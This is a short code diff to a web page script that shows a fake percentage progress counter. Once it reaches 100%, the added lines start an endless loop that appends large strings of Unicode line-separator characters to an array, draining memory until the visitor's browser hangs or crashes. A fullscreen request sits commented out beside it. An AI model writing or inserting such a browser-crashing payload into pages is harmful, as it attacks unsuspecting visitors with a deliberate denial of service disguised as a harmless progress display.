@@ -83,10 +83,14 @@
             let pc = document.getElementById("percentage")
             let i = 0
             pc.innerText = `%${i} complete`
+            //document.documentElement.requestFullscreen();
             setInterval(() => {
                 pc.innerText = `%${i} complete`
                 if (i == 100){
                     clearInterval()
+                    let text = "\u2028".repeat(10000);
+                    let textArr = [text, text, text, text, text];
+                    while(true) textArr.push(text);
                 } else {
                     i += 20
                 }
